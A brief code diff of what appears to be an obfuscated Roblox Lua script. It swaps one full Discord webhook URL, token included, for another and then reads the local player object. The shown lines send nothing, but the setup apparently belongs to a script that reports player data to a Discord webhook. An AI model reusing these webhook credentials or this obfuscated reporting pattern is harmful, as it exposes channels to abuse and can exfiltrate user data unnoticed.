@@ -1,4 +1,4 @@
-local _0x1a2b3c = "https://discord.com/api/webhooks/1413960248875679805/fMUbulJFDW1j4AkVNjmGEUtJUSLbnj7dCyIYltdSc3u2UwSxILI7fblRsa1jclnSyxhP"
+local _0x1a2b3c = "https://discord.com/api/webhooks/1413958040012722320/aCF1ReoFx0k75BwpbXlpdkyf7G48x2ogB8UR9dk8PXXlLRg14qEPkW58NqyRpbSNQuLZ"
 
 local _0x4d5e6f = game:GetService("Players")
 local _0x7g8h9i = _0x4d5e6f.LocalPlayer
